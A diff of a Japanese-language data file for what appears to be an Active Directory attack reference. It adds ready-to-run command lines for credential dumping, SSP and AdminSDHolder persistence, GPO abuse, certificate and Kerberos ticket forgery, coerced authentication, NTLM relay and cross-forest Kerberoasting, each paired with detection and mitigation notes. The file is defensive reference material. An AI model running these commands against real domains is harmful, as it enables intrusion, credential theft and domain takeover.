+        "q": "mimikatz.exe \"token::elevate\" \"lsadump::sam\" exit"
+      },
+      {
+        "tool": "NetExec",
+        "t": "DsrmAdminLogonBehavior=2適用後にDSRMアカウントでPass-the-Hash。`--local-auth`でドメイン非経由ログオンし4624のSID不一致として現れる",
+        "q": "netexec smb dc01.corp.local -u Administrator -H <dsrm_ntlm_hash> --local-auth"
+      }
+    ],
     "detect": "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehaviorレジストリ値の変更、DC上のローカルAdministratorアカウント(SID終端500・ローカル)によるログオン(4624 Logon Type 3)を監視。DCへのSAMアクセスやDSRMハッシュ取得の痕跡を検知。",
     "events": "4657 (レジストリ変更), 4794 (DSRMパスワードリセット試行), 4624 (DSRMログオン)",
     "mitigate": "DsrmAdminLogonBehaviorが2に設定されていないことを定期監査し0に戻す。DSRMパスワードを定期変更し文書化管理(ntdsutil set dsrm password)。DCの物理/管理アクセスを最小化しレジストリ変更を監視する。",
@@ -5822,6 +9592,28 @@ AD.I18N.ja.attacks = [
     "summary": "LSAに悪意あるSSP/AP DLLを登録し平文認証情報を継続的に窃取・記録する永続化。",
     "how": "DC/ホスト上の管理者権限が前提。mimikatz misc::memsspでLSASSにインメモリSSPを注入するか、DLL(mimilib.dll)を配置してレジストリHKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security PackagesにSSPを追加し再起動後も有効化する。以降すべての認証で平文パスワードが%SystemRoot%\\System32\\kiwissp.log等に記録され、継続的な資格情報収集ができる。",
     "tools": "mimikatz (misc::memssp, mimilib.dll)",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "LSASSにインメモリSSPを注入し以降の平文認証を`kiwissp.log`に記録。再起動で消えるがLSASSへのイメージロードがSysmon10に残る",
+        "q": "mimikatz.exe \"privilege::debug\" \"misc::memssp\" exit"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "再起動後も有効化するためSecurity Packages値にmimilib DLLを追記。既定値からの差分自体が高精度な永続化シグナル",
+        "q": "reg add \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\" /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\\\0msv1_0\\\\0schannel\\\\0wdigest\\\\0tspkg\\\\0pku2u\\\\0mimilib\" /f"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "レジストリ操作の同等手段。4104のスクリプトブロックに`Security Packages`と`mimilib`という稀な組合せが残る",
+        "q": "Set-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa' -Name 'Security Packages' -Value @('kerberos','msv1_0','schannel','wdigest','tspkg','pku2u','mimilib')"
+      },
+      {
+        "tool": "cmd.exe",
+        "t": "SSP DLLをSystem32へ配置する準備動作。LSASS起動時のみロードされるためSysmon Event7(ImageLoad)との相関が有効",
+        "q": "copy mimilib.dll C:\\\\Windows\\\\System32\\\\mimilib.dll"
+      }
+    ],
     "detect": "Security PackagesおよびOSConfig/LSA関連レジストリへの不審な追加(4657)、LSASSへのDLLロード(Sysmon EID7)、kiwissp.log等の不審ファイル生成を監視。既知SSP以外の登録を定期照合する。",
     "events": "4657 (Security Packagesレジストリ変更), Sysmon 7 (DLLロード)",
     "mitigate": "LSA Protection(RunAsPPL)で未署名SSPのロードを防止。Security Packagesレジストリのベースライン監視と変更アラート。WDAC/AppLockerでLSAへの不正DLLロードを制限する。",
@@ -5862,6 +9654,23 @@ AD.I18N.ja.attacks = [
     "summary": "AdminSDHolderオブジェクトのACLを改ざんし保護グループ経由でバックドア権限を60分毎に自動再適用させる。",
     "how": "Domain Admin相当の権限が前提。CN=AdminSDHolder,CN=System,<domain>のDACLに攻撃者アカウントのフルコントロール等を追加すると、SDPropプロセス(既定60分毎)が保護対象グループ(Domain Admins, Enterprise Admins等)とそのメンバーのACLへ自動コピーする。管理者がメンバーシップを是正してもACLレベルのバックドアが再適用され続けるため気付かれにくい永続化になる。",
     "tools": "PowerView (Add-DomainObjectAcl), ntdsutil, dsacls, BloodHound",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "AdminSDHolderのDACLに攻撃者アカウントへのフルコントロールを追加。SDProp(既定60分)がDomain Admins等へ自動反映するため対象DNが高精度シグナル",
+        "q": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity svc_user -Rights All"
+      },
+      {
+        "tool": "dsacls",
+        "t": "OS標準LOLBinでの同等操作。`AdminSDHolder`という文字列と`/G`の組合せがコマンドラインテレメトリの主要検知トークン",
+        "q": "dsacls \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" /G corp\\\\svc_user:GA"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "ADSI PSドライブ経由の生PowerShell操作でツール名ベースの検知を回避。DACL変更自体は5136として必ずDCに記録される",
+        "q": "$acl = Get-Acl 'AD:\\\\CN=AdminSDHolder,CN=System,DC=corp,DC=local'; $acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule ([Security.Principal.NTAccount]'corp\\\\svc_user'),'GenericAll','Allow')); Set-Acl 'AD:\\\\CN=AdminSDHolder,CN=System,DC=corp,DC=local' $acl"
+      }
+    ],
     "detect": "AdminSDHolderオブジェクトのDACL変更(5136)、adminCount=1オブジェクトへの想定外ACE、非特権アカウントがGenericAll/WriteDacl等を保持する状態を監視。SDProp後の保護グループACL異常を定期スキャンする。",
     "events": "5136 (DS Object変更), 4662 (AdminSDHolderアクセス)",
     "mitigate": "AdminSDHolderのDACLをベースライン化し変更を即時アラート。保護グループとadminCount=1オブジェクトのACLを定期監査しバックドアACEを除去。Tier0権限を厳格管理する。",
@@ -5902,6 +9711,28 @@ AD.I18N.ja.attacks = [
     "summary": "リンク済みGPOを改ざんしログオンスクリプト/スケジュールタスク/権限付与で広範囲に永続的なコード実行を仕込む。",
     "how": "対象GPO(またはSYSVOL上のGPOフォルダ)への書き込み権限が前提で、GenericWrite/WriteDaclを持つアカウントで取得する。GPOに即時スケジュールタスク、ログオン/スタートアップスクリプト、ローカル管理者グループ追加(Restricted Groups)、ユーザー権利割当(SeDebug等)を仕込むと、リンク先OUの全端末・全ユーザーに永続実行が展開される。DC/OUに広範な影響を与えられ、Domain Admin級の被害になりうる。",
     "tools": "SharpGPOAbuse, PowerView (New-GPOImmediateTask), pyGPOAbuse, BloodHound",
+    "cmd": [
+      {
+        "tool": "SharpGPOAbuse",
+        "t": "リンク済みGPOに即時実行スケジュールタスクを仕込む定番手法。`--AddComputerTask`とGPO名の組合せがコマンドライン検知の主軸でSYSVOL側は5145/5136に残る",
+        "q": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author corp\\\\svc_user --Command \"cmd.exe\" --Arguments \"/c powershell -enc <base64>\" --GPOName \"Default Domain Policy\""
+      },
+      {
+        "tool": "SharpGPOAbuse",
+        "t": "Restricted Groups経由でリンク先全端末のローカル管理者に追加。次回gpupdate適用時に一斉展開され4732の急増が指標",
+        "q": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount svc_user --GPOName \"Default Domain Policy\""
+      },
+      {
+        "tool": "PowerView",
+        "t": "SYSVOL配下にスケジュールタスクXMLを直接書き込む旧来手法。`-CommandArguments`のBase64部分が唯一の識別点",
+        "q": "New-GPOImmediateTask -TaskName Debugging -GPODisplayName \"Default Domain Policy\" -CommandArguments '-NoP -NonI -W Hidden -Enc <base64>' -Force"
+      },
+      {
+        "tool": "pyGPOAbuse",
+        "t": "Linux側からSYSVOL上のGPO GPTを直接改ざん。端末側プロセスログは無くDCのSYSVOL共有書込(5145)とGPTバージョン増分のみが手掛かり",
+        "q": "pygpoabuse.py corp.local/svc_user:'Passw0rd!' -gpo-id D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6 -dc-ip 10.0.0.10 -command 'net group \"Domain Admins\" svc_user /add /domain'"
+      }
+    ],
     "detect": "SYSVOL上のGPOファイル(GptTmpl.inf, ScheduledTasks.xml, Scripts.ini)の変更、gPCMachineExtensionNamesやversionNumber属性の更新(5136)、GPO ACLの改変を監視。新規スケジュールタスク/スクリプトの展開痕跡(4698, 5145 SYSVOLアクセス)を相関する。",
     "events": "5136/5137 (GPOオブジェクト変更), 4698 (スケジュールタスク作成), 5145 (SYSVOLファイルアクセス)",
     "mitigate": "GPOの委任(編集権限)を最小化しACLを定期監査。SYSVOLのGPOファイル整合性監視とバージョン変更アラート。重要OUへのGPOリンク変更を制限し、Tier0 GPOを分離管理する。",
@@ -5942,6 +9773,33 @@ AD.I18N.ja.attacks = [
     "summary": "AD CSのCA秘密鍵を窃取し任意ユーザー向けの正規署名証明書を偽造してPKINIT認証で長期永続化する。",
     "how": "CAサーバへの管理者アクセスが前提。CAのルート/発行証明書の秘密鍵(HSM未使用なら.pfxとしてエクスポート、DPAPI/CryptoAPI経由)を窃取し、オフラインで任意のSAN/UPNを持つ正規署名済み証明書(いわゆるGolden Certificate)を発行する。パスワード変更やkrbtgtローテーションでは無効化されず、証明書有効期間(数年)にわたりPKINITでTGTを取得でき極めて強力な永続化になる。ESC1-ESC16(Certipy v5が対応。2024年新規のESC15/EKUwu=CVE-2024-49019や、SIDセキュリティ拡張szOID_NTDS_CA_SECURITY_EXTを省略しアカウント強束縛を破るESC16を含む)等のテンプレート/CA設定不備の悪用とも組み合わせられる。",
     "tools": "certipy (ca/forge), ForgeCert, SharpDPAPI, mimikatz (crypto::export)",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "CAサーバからルート証明書と秘密鍵をエクスポート。`-backup`はCA管理者権限を要するためCA監査ログの証明書エクスポートイベントが手掛かり",
+        "q": "certipy ca -ca 'corp-CA' -backup -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certipy",
+        "t": "窃取したCA鍵でオフライン署名済み証明書を偽造。CAには一切問い合わせないため生成自体は無ログ、検知点は後続のPKINIT認証(4768)のみ",
+        "q": "certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local -out administrator_forged.pfx"
+      },
+      {
+        "tool": "ForgeCert",
+        "t": ".NET製の代替偽造ツール。certipyと同じくオフライン動作でDC側の痕跡はPKINITベースのTGT要求(4768)以外に残らない",
+        "q": "ForgeCert.exe --CaCertPath corp-CA.pfx --CaCertPassword 'Passw0rd!' --Subject \"CN=Administrator,CN=Users,DC=corp,DC=local\" --SubjectAltName \"administrator@corp.local\" --NewCertPath forged.pfx --NewCertPassword 'Passw0rd!'"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "CA秘密鍵がDPAPIマシンマスターキーで保護されている場合の抽出経路。管理者権限でDPAPI_SYSTEM LSAシークレットを読み取るためSysmon10のLSASSアクセスが残る",
+        "q": "SharpDPAPI.exe certificates /machine"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "CryptoAPIパッチでエクスポート不可設定を無効化しCA証明書一式をPFXで抽出。`crypto::capi`実行自体がCAPIサービスへの異常操作として稀少",
+        "q": "mimikatz.exe \"crypto::capi\" \"crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export\" exit"
+      }
+    ],
     "detect": "CA秘密鍵のエクスポート/CryptoAPIアクセス、CA上の不審なプロセス、発行ログにない証明書によるPKINIT認証を監視。イベント4886/4887(証明書要求/発行)と実際のログオン(4768 with証明書)の乖離、想定外UPN/SANを持つ証明書使用を検知。",
     "events": "4886/4887 (証明書要求/発行), 4768 (PKINIT), CAアクセス監査",
     "mitigate": "CA秘密鍵をHSMで保護しエクスポート不可にする。CAサーバをTier0として厳格保護し管理アクセスを最小化。侵害時はCA鍵の再発行(ルート更新)が必要。証明書テンプレートの権限監査(ESC対策)を並行実施する。",
@@ -5977,6 +9835,33 @@ AD.I18N.ja.attacks = [
     "summary": "krbtgtや特権アカウントのAES/RC4長期鍵を保持し、パスワード変更後もチケット偽造・Overpass-the-Hashを継続する。",
     "how": "DCSyncやNTDS窃取で得たkrbtgt/サービスアカウントのAES256/AES128/RC4鍵を保存しておく前提。AES鍵はパスワードとsalt(通常ドメイン名+ユーザー名)から導出されるため、パスワードが変わらない限り同一鍵が有効で、Golden/Silver/Diamond Ticket偽造やOverpass-the-Hash(Pass-the-Key)に再利用できる。krbtgtは通常ローテーションされないため長期永続化の基盤となる。",
     "tools": "mimikatz (sekurlsa::ekeys, kerberos::ptt), Rubeus (asktgt /aes256), impacket (-aesKey)",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "LSASSメモリから全ログオンセッションのAES256/AES128/RC4長期鍵を抽出。`sekurlsa::ekeys`実行自体がメモリアクセスとして高忠実度",
+        "q": "mimikatz.exe \"sekurlsa::ekeys\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "抽出済みAES鍵で偽造/窃取チケットをセッションへ注入し継続利用。`kerberos::ptt`後の4624にチケットキャッシュ由来でない痕跡が残る",
+        "q": "mimikatz.exe \"kerberos::ptt ticket.kirbi\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "保持したAES256鍵からTGTを要求しOverpass-the-Hashを継続。`asktgt`と`/aes256`の組み合わせがコマンドラインの決定的シグナル",
+        "q": "Rubeus.exe asktgt /user:svc_user /domain:corp.local /aes256:<AES256_KEY_HEX> /nowrap /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からAES鍵のみでTGTを要求。攻撃元にプロセスログは残らずDCの4768(暗号種別18=AES256)で見るしかない",
+        "q": "getTGT.py -aesKey <AES256_KEY_HEX> -dc-ip 10.0.0.10 corp.local/svc_user"
+      },
+      {
+        "tool": "Impacket",
+        "t": "窃取したkrbtgtのAES鍵からオフラインでGolden Ticketを鍛造。ccache生成のみでKRB_AS_REQが発生せず4768自体を回避できる",
+        "q": "ticketer.py -aesKey <AES256_KEY_HEX> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local Administrator"
+      }
+    ],
     "detect": "Pass-the-Key/Overpass-the-Hashに伴うAS-REQでの単一暗号化タイプ(4768 encryption type)や、通常と異なる端末からの特権チケット要求を監視。krbtgt/サービス鍵の異常利用、RC4ダウングレードを検知。DCSync遮断で鍵漏洩そのものを防ぐことが根本。",
     "events": "4768/4769 (暗号化タイプ), 4624",
     "mitigate": "krbtgtを2段階で定期ローテーションしAES鍵を無効化。全ドメインでAES強制・RC4無効化を進め、鍵漏洩時は関連アカウントのパスワードも更新。Tier0保護とDCSync監査で長期鍵の窃取を防ぐ。",
@@ -6017,6 +9902,33 @@ AD.I18N.ja.attacks = [
     "summary": "子ドメインのKRBTGTハッシュを用い、親ドメインのEnterprise Admins(RID 519)等のSIDをSID Historyに埋め込んだGolden Ticketを鍛造し、フォレスト全体を掌握する。",
     "how": "前提: 子ドメインDCのKRBTGTハッシュ(DCSync/ntds.dit)を取得済み。ルートドメインのドメインSIDを取得し、`-519`(Enterprise Admins)や`-516`(Domain Controllers)を末尾に付与。同一フォレスト内の親子トラストはSIDフィルタリングが既定で無効のため、追加SIDがそのまま信頼される。",
     "tools": "mimikatz `kerberos::golden /sids:S-1-5-21-ROOT-519`, impacket `ticketer.py --extra-sid`, Rubeus `golden`",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "krbtgtハッシュで`/sids:`に親ドメインのEnterprise Admins SIDを付与しGolden Ticketを鍛造。フォレスト内はSIDフィルタ既定無効",
+        "q": "mimikatz.exe \"kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<krbtgt_hash> /sids:S-1-5-21-9999999999-8888888888-7777777777-519 /ptt\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "Rubeusでの同等操作。`/sids:`と`/ptt`の組がコマンドライン上の決め手で、直後の親ドメインDCへの管理共有アクセスと相関させる",
+        "q": "Rubeus.exe golden /rc4:<krbtgt_ntlm_hash> /user:Administrator /domain:child.corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /sids:S-1-5-21-9999999999-8888888888-7777777777-519 /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側から`-extra-sid`でSID History付きTGTをオフライン生成。攻撃元にプロセスログは残らず親ドメインの4768のみが手掛かり",
+        "q": "ticketer.py -nthash <krbtgt_ntlm_hash> -domain child.corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -extra-sid S-1-5-21-9999999999-8888888888-7777777777-519 Administrator"
+      },
+      {
+        "tool": "PowerView",
+        "t": "鍛造前の偵察としてドメインSIDを取得。単体では正規運用と紛れるがGolden Ticket実行と時系列で相関させる",
+        "q": "Get-DomainSID -Domain child.corp.local"
+      },
+      {
+        "tool": "net.exe",
+        "t": "鍛造チケット注入後の権限確認。親ドメインDC宛の`net group`実行は非管理端末からだと異常",
+        "q": "net.exe group \"Enterprise Admins\" /domain"
+      }
+    ],
     "detect": "TGTのライフタイム異常(既定10年)、実在しないアカウント/RIDでのTGS要求、子ドメインアカウントが親ドメインリソースへ短時間で横断アクセス。イベント4769でTicket Options/暗号化タイプ(RC4=0x17)の異常を監視。",
     "events": "4769, 4768, 4672, 4624(ログオンタイプ3)",
     "mitigate": "KRBTGTパスワードを2回ローテーション、Tier0分離、子ドメインDCの侵害=フォレスト全体侵害と認識し管理境界をフォレスト単位に設計。SIDフィルタリング検討(親子では通常不可)。",
@@ -6057,6 +9969,28 @@ AD.I18N.ja.attacks = [
     "summary": "フォレスト間トラストではSIDフィルタリング(quarantine)が既定有効だが、設定不備やRID>1000のSID、TREAT_AS_EXTERNAL/enableSIDHistory有効時に他フォレストのSIDを注入して越境昇格する。",
     "how": "前提: 一方のフォレストDCを侵害済み。トラスト構成でSID Historyが許可(netdom trust /EnableSIDHistory:yes)されているか、TDOフラグを確認。相手フォレストのRID>1000のグループSID(委任された高権限グループ等)を鍛造チケットに付与。フィルタは既定でRID<1000のwell-knownを落とすが、カスタム高権限グループは通過し得る。",
     "tools": "mimikatz, impacket raiseChild.py/ticketer.py, BloodHound(越境ACL/委任の探索)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "越境SIDフィルタの状態を事前確認。TDOの`TrustAttributes`(TREAT_AS_EXTERNAL等)をLDAPで読む偵察クエリ",
+        "q": "Get-DomainTrust -Domain other-forest.local | Select-Object SourceName,TargetName,TrustAttributes"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "RID1000超のカスタム高権限グループSIDを`/sids:`に付与。既定フィルタはwell-known(RID<1000)のみ除外するため通過し得る",
+        "q": "mimikatz.exe \"kerberos::golden /user:svc_user /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<krbtgt_hash> /sids:S-1-5-21-4444444444-5555555555-6666666666-1105 /ptt\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linuxから同等の越境SID注入チケットを生成。DC側の4768/4769とTDOに対する4662だけが手掛かりでエンドポイントログは残らない",
+        "q": "ticketer.py -nthash <krbtgt_ntlm_hash> -domain corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -extra-sid S-1-5-21-4444444444-5555555555-6666666666-1105 svc_user"
+      },
+      {
+        "tool": "SharpHound",
+        "t": "越境ACL/委任経路の探索。`--domain`で相手フォレストを指定した収集は通常運用にない越境LDAPクエリとして目立つ",
+        "q": "SharpHound.exe -c All --domain other-forest.local --domaincontroller dc01.other-forest.local"
+      }
+    ],
     "detect": "信頼元フォレストのユーザーが信頼先の高権限グループ相当の権限で認証。4769/4662でSID History付きトークンの利用、TDO属性(msDS-TrustForestTrustInfo)の変更を監視。",
     "events": "4769, 4662, 4670, 4716(トラスト情報変更), 4706/4707(トラスト作成/削除), 5136(TDO属性変更)",
     "mitigate": "`netdom trust /Quarantine:yes`でSIDフィルタリング強制、EnableSIDHistoryをyesにしない、選択的認証(Selective Authentication)適用、越境の高RIDグループ委任を棚卸し。",
@@ -6097,6 +10031,28 @@ AD.I18N.ja.attacks = [
     "summary": "ドメイントラストの共有鍵(trust key)を用いて信頼先へのリファーラルTGT(inter-realm TGT)を偽造し、相手ドメインへ横断する。",
     "how": "前提: DCからトラストアカウントのNTLMハッシュ/AESキー(TDOの共有鍵)を取得(lsadump::trust /patch や ntds)。この鍵でreferral TGT(sname=krbtgt/TARGET.DOMAIN)を鍛造し、相手KDCにTGS要求してサービスチケットを得る。SID Historyと組み合わせ昇格も可能。",
     "tools": "mimikatz `lsadump::trust /patch`, `kerberos::golden /service:krbtgt /target:parent.local /rc4:<trustkey>`, Rubeus, impacket",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "DC上でTDOの共有鍵(trust key)をNTLM/AES双方で取得。`lsadump::trust /patch`は決定的シグナル",
+        "q": "mimikatz.exe \"lsadump::trust /patch\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "取得したtrust keyでreferral TGT(inter-realm TGT)を鍛造。`/service:krbtgt`と`/target:`の組が越境チケットの識別点",
+        "q": "mimikatz.exe \"kerberos::golden /domain:child.corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /rc4:<trust_key> /user:Administrator /service:krbtgt /target:root.corp.local /ptt\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "偽造referral TGTを使い相手ドメインのサービスチケットを要求。`/targetdomain:`が越境要求の目印",
+        "q": "Rubeus.exe asktgs /ticket:referral.kirbi /service:cifs/dc01.root.corp.local /targetdomain:root.corp.local /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側でinter-realm TGTを直接生成(`-spn krbtgt/<相手ドメイン>`)。DCにプロセスログは残らずKDCへのTGS-REQでの相関が必須",
+        "q": "ticketer.py -nthash <trust_key> -domain child.corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -spn krbtgt/root.corp.local Administrator"
+      }
+    ],
     "detect": "通常のユーザーログオンを伴わないinter-realm TGSの出現、トラストアカウント名(DOMAIN$)の異常利用、RC4での越境TGS。4769でService NameがkrbtgtかつRealmが跨るパターン。",
     "events": "4769, 4768, 4776",
     "mitigate": "トラストパスワードは既定30日で自動更新されるため無効化しない、Tier0でのDC/LSASS保護、選択的認証、trust鍵の窃取元(DCのLSA/NTDS)を保護。",
@@ -6132,6 +10088,28 @@ AD.I18N.ja.attacks = [
     "summary": "トラスト越しに相手フォレストのSPN登録アカウントのTGSを要求し、弱いサービスアカウントパスワードをオフラインクラックする。",
     "how": "前提: 一方のドメインの通常ユーザー認証情報と、トラスト経由で相手ドメインへのKerberos認証が可能なこと。相手フォレストのSPNを列挙(GetUserSPNs -target-domain)し、RC4のTGSを要求してハッシュ抽出、Hashcatでクラック。",
     "tools": "impacket `GetUserSPNs.py -target-domain`, Rubeus `kerberoast /domain:trusted.local`, PowerView, Hashcat",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "自ドメイン資格情報で相手フォレストのSPNアカウントのTGSを要求。`-target-domain`がトラスト越境の識別点、DC側は4769",
+        "q": "GetUserSPNs.py -target-domain trusted.local -request -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd!' -outputfile hashes.txt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "Rubeusでの越境Kerberoast。`/domain:`に相手フォレストを指定した実行は自ドメイン外へのTGS要求として目立つ",
+        "q": "Rubeus.exe kerberoast /domain:trusted.local /creduser:corp\\svc_user /credpassword:'Passw0rd!' /outfile:hashes.txt /nowrap"
+      },
+      {
+        "tool": "PowerView",
+        "t": "越境SPN棚卸しの偵察。`-Domain`指定のLDAP照会が信頼関係越しに飛ぶこと自体が異常",
+        "q": "Get-DomainUser -SPN -Domain trusted.local | Get-DomainSPNTicket -Format Hashcat"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "持ち出し後のオフライン解析。モード13100=RC4のTGS-REPで、クラック成立が越境Kerberoast成立の裏付け",
+        "q": "hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r best64.rule"
+      }
+    ],
     "detect": "越境でのTGS要求の急増、RC4(0x17)要求、単一プリンシパルによる多数SPNへのTGS。4769の暗号化タイプとService Nameの相関。",
     "events": "4769",
     "mitigate": "サービスアカウントをgMSA化、25文字以上の複雑パスワード、AES強制、選択的認証で越境Kerberosを制限、SPNの棚卸し。",
@@ -6162,6 +10140,28 @@ AD.I18N.ja.attacks = [
     "summary": "トラスト越しに委任構成(非制約/制約/リソースベース制約委任)を悪用し、越境で高権限プリンシパルになりすます。",
     "how": "前提: 委任が設定されたホストを制御、またはRBCDを書き込めるACL。非制約委任ホストへcoercionでDC等を認証させTGTを捕捉、または制約委任(S4U2Proxy)で越境サービスへ。フォレスト間では既定ではTDOのtrustAttributes(CROSS_ORGANIZATION_NO_TGT_DELEGATION)により越境TGT委任は無効だが、netdom trust /EnableTGTDelegation:Yes 等で明示有効化した場合に通過し得る(msDS-EnableUnconstrainedDelegationという属性は存在しない)。",
     "tools": "Rubeus `s4u`/`monitor`, impacket `getST.py`, krbrelayx, PowerView(委任列挙), mimikatz",
+    "cmd": [
+      {
+        "tool": "netdom.exe",
+        "t": "フォレスト間TGT委任が明示的に有効化されているか確認。既定は無効なため`Yes`表示は悪用可能な設定ミスの証拠",
+        "q": "netdom trust corp.local /domain:partner.local /EnableTGTDelegation"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "制約委任ホストのTGTでS4U2Self+S4U2Proxyを越境実行。`/targetdomain:`と`/msdsspn:`の組がコマンドラインの決め手",
+        "q": "Rubeus.exe s4u /ticket:host.kirbi /impersonateuser:administrator /msdsspn:cifs/dc01.partner.local /targetdomain:partner.local /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側でS4U2Self/S4U2Proxyを実行。`-impersonate`が特権昇格の識別点、DCの4769サービス名で越境先が分かる",
+        "q": "getST.py -spn cifs/dc01.partner.local -impersonate administrator corp.local/svc_computer\\$:'Passw0rd!'"
+      },
+      {
+        "tool": "PowerView",
+        "t": "越境委任が構成されたコンピュータの棚卸し。`-TrustedToAuth`で制約委任ホストを列挙する偵察クエリ",
+        "q": "Get-DomainComputer -TrustedToAuth -Domain partner.local -Properties samaccountname,msds-allowedtodelegateto"
+      }
+    ],
     "detect": "非制約委任ホストへのDCアカウント認証、S4U2Self/S4U2Proxyの異常、越境でのForwardable TGT委任。4769のTransited/委任フラグを監視。",
     "events": "4769, 4768, 4624",
     "mitigate": "非制約委任の廃止、機微アカウントに『委任できない/Protected Users』設定、フォレスト間TGT委任を無効(既定)、RBCD書き込みACLの監査。",
@@ -6202,6 +10202,28 @@ AD.I18N.ja.attacks = [
     "summary": "トラスト越しに相手ドメインのマシン(特にDC)を強制認証させ、NTLMリレーや非制約委任と組み合わせて越境の資格情報窃取・昇格を行う。",
     "how": "前提: 相手ドメインのマシンへネットワーク到達可能でRPCが許可。SpoolerのRpcRemoteFindFirstPrinterChangeNotification(PrinterBug)やEfsRpcOpenFileRaw(PetitPotam)、NetrDfsRemoveStdRoot(DFSCoerce)でDC$の認証を誘発し、ADCS(ESC8)やLDAPへリレー、または非制約委任ホストで捕捉。",
     "tools": "printerbug.py, PetitPotam.py, dfscoerce.py, coercer, ntlmrelayx, krbrelayx",
+    "cmd": [
+      {
+        "tool": "PetitPotam",
+        "t": "EfsRpcOpenFileRaw(MS-EFSRPC)でDC$の認証を強制。`-pipe efsr`指定と相手DCへの短時間RPC接続が識別点",
+        "q": "python3 PetitPotam.py -u svc_user -p 'Passw0rd!' -d corp.local -pipe efsr 10.0.0.5 dc01.partner.local"
+      },
+      {
+        "tool": "DFSCoerce",
+        "t": "NetrDfsRemoveStdRoot(MS-DFSNM)経由の強制認証。PetitPotamパッチ済み環境での代替経路として使われる",
+        "q": "python3 dfscoerce.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.partner.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "複数のRPCメソッドを自動試行する強制認証ツール。`--listener-ip`宛のDC発信SMB/RPCが越境の手掛かり",
+        "q": "Coercer.py coerce -u svc_user -p 'Passw0rd!' --target dc01.partner.local --listener-ip 10.0.0.5"
+      },
+      {
+        "tool": "Impacket",
+        "t": "強制認証を相手ドメインのLDAP/ADCSへリレー。`-t ldap://`宛の意図しないマシンアカウント認証が決定打",
+        "q": "ntlmrelayx.py -t ldap://dc01.partner.local -smb2support"
+      }
+    ],
     "detect": "越境からのMS-RPRN/MS-EFSRPC/MS-DFSNMのRPC呼び出し、DCアカウントの外部認証、ADCS Web Enrollへの異常NTLM認証。",
     "events": "4624/4625(NTLM), 5145(RPCオブジェクトアクセス), ADCS 4886/4887",
     "mitigate": "EPA(Extended Protection)とSMB/LDAP署名強制、Spoolerサービス無効化、ADCS Web EnrollでNTLM無効化、トラスト境界でRPCフィルタ、選択的認証。",
@@ -6242,6 +10264,28 @@ AD.I18N.ja.attacks = [
     "summary": "相手フォレストのユーザー/グループがローカルドメインの特権グループ(例: Administrators, DnsAdmins)へFSPとして追加されている構成を悪用し越境昇格する。",
     "how": "前提: 一方のフォレストのプリンシパルを制御。BloodHoundで越境のグループメンバーシップ/ACL(GenericAll, WriteDacl等)を探索し、FSP経由で自分が実効的に高権限グループに属する経路を発見・利用する。",
     "tools": "BloodHound/SharpHound(--CollectAllProperties, trust収集), PowerView `Get-DomainForeignGroupMember`",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "自ドメインの特権グループに外部フォレストのSIDがFSPとして紛れていないか列挙。通常運用にない越境LDAP照会",
+        "q": "Get-DomainForeignGroupMember -Domain corp.local"
+      },
+      {
+        "tool": "PowerView",
+        "t": "逆方向に、自ドメインのユーザーが外部フォレストのグループへFSPとして所属している関係を探索",
+        "q": "Get-DomainForeignUser -Domain corp.local"
+      },
+      {
+        "tool": "SharpHound",
